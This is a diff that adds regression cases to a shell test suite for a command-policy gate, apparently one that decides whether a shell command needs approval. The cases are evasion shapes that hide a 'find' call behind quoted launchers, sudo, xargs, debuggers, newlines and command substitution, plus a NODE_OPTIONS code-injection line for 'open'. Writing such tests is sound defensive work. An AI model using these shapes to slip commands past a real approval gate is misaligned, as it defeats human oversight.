+# "add every r5 probe row" requirement): pin every probe row from
+# review/pr-261-r5/tmp/main-probes.out as a permanent suite case — both the
+# ones that were FAILing (R5-NL newline-segment-separator, R5-QWRAP
+# recursive quoted-launcher unwrap, MEDIUM launcher-dispatch-parity) and
+# the ones already PASSing, so a future change can't silently regress any
+# of them. Exact duplicates of already-pinned rows above (the `open -b`
+# bundle-id case) are skipped rather than re-asserted.
+check "#261 r6 QL-command: a quoted 'command' launcher ahead of find escalates" \
+  "'command' find . * -maxdepth 0" escalate
+check "#261 r6 QL-exec: a quoted 'exec' launcher ahead of find escalates" \
+  "'exec' find . * -maxdepth 0" escalate
+check "#261 r6 QL-nice: a quoted 'nice' launcher ahead of find escalates" \
+  "'nice' -n 5 find . * -maxdepth 0" escalate
+check "#261 r6 QL-env (regression): a quoted 'env' launcher ahead of find escalates" \
+  "'env' find . * -maxdepth 0" escalate
+check "#261 r6 QL-sudo: a quoted 'sudo' launcher ahead of find escalates" \
+  "'sudo' find . * -maxdepth 0" escalate
+check "#261 r6 QL-time: a quoted 'time' launcher ahead of find escalates" \
+  "'time' find . * -maxdepth 0" escalate
+check "#261 r6 QL-nohup: a quoted 'nohup' launcher ahead of find escalates" \
+  "'nohup' find . * -maxdepth 0" escalate
+check "#261 r6 QL-plain (regression): a bare unquoted find still escalates" \
+  "find . * -maxdepth 0" escalate
+check "#261 r6 NL-prefix: a real newline segment separator ahead of find escalates" \
+  $'echo harmless\nfind . * -maxdepth 0' escalate
+check "#261 r6 NL-suffix (regression): a real newline segment separator after find still escalates" \
+  $'find . * -maxdepth 0\necho harmless' escalate
+check "#261 r6 NL-dollar: a real newline ahead of find's \$-expansion N3 shape escalates" \
+  $'echo harmless\nfind . $X' escalate
+check "#261 r6 NL-semicolon: a semicolon-then-newline ahead of find still escalates" \
+  $'echo harmless;\nfind . * -maxdepth 0' escalate
+check "#261 r6 TERM-empty-quote (regression): an empty-single-quote -exec terminator still escalates" \
+  "find . -exec echo {} ''\\; * -maxdepth 0" escalate
+check "#261 r6 TERM-double-empty (regression): an empty-double-quote -exec terminator still escalates" \
+  "find . -exec echo {} \"\"\\; * -maxdepth 0" escalate
+check "#261 r6 TERM-empty-before (regression): a quote-then-semicolon -exec terminator still escalates" \
+  "find . -exec echo {} \\'\\; * -maxdepth 0" escalate
+check "#261 r6 XARGS-find: xargs launching find escalates (launcher-dispatch-parity)" \
+  "xargs find . * -maxdepth 0" escalate
+check "#261 r6 LOCKF-find: lockf launching find escalates (launcher-dispatch-parity)" \
+  "lockf /tmp/lock find . * -maxdepth 0" escalate
+check "#261 r6 SSHAGENT-find: ssh-agent launching find escalates (launcher-dispatch-parity)" \
+  "ssh-agent find . * -maxdepth 0" escalate
+check "#261 r6 DTRACE-find: dtrace -c launching find escalates (launcher-dispatch-parity)" \
+  "dtrace -c 'find . * -maxdepth 0'" escalate
+check "#261 r6 LLDB-find: lldb -- launching find escalates (launcher-dispatch-parity)" \
+  "lldb -- find . * -maxdepth 0" escalate
+check "#261 r6 TASKPOLICY-find (regression): taskpolicy -c launching find still escalates" \
+  "taskpolicy -c utility find . * -maxdepth 0" escalate
+check "#261 r6 OPEN-env (regression): open --env app-selection still escalates" \
+  "open --env NODE_OPTIONS=--require=/tmp/x.js /tmp/x.command" escalate
+check "#261 r6 OPEN-read (regression): a bare open with a path argument stays allow" \
+  "open /tmp/x.command" allow
+check "#261 r6 R5-SUBST: find hidden inside an unrelated command's \$(...) argument escalates" \
+  'printf "%s\n" "$(find . * -maxdepth 0)"' escalate
+check "#261 r6 R5-SUBST: find hidden inside a backtick substitution escalates" \
+  'printf "%s\n" "`find . * -maxdepth 0`"' escalate
+check "#261 r6 R5-QWRAP: a chain of individually-quoted launchers still unwraps to find" \
+  "'nice' -n 5 'sudo' find . * -maxdepth 0" escalate
+
 echo "-----------------------------------------------------------------"
 if [ "$failed" -eq 0 ]; then
   printf 'PASS: %d/%d command-policy cases passed\n' "$total" "$total"
